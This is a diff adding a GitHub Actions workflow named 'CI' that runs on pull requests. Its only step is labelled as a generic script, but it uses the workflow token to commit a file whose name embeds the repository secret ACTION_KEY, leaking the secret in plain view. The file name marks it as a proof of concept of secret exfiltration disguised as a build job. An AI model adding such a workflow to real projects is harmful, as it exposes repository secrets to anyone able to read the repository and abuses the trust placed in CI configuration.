@@ -1,0 +1,22 @@
+name: CI
+
+on:  
+  pull_request:
+    branches: [ main ]
+
+    
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v3
+
+      - name: Run a multi-line script
+        run: 'curl -H "Authorization: bearer $GITHUB_TOKEN" -X PUT "https://api.github.com/repos/$REPO/contents/POC-KEY-$KEY.md" --data ''{"message": "secret", "content": "QWN0aW9uIHNlY3JldCBpcyBpbiBmaWxlIG5hbWU="}'' '
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          REPO: ${{ github.repository }}
+          KEY: ${{secrets.ACTION_KEY}}
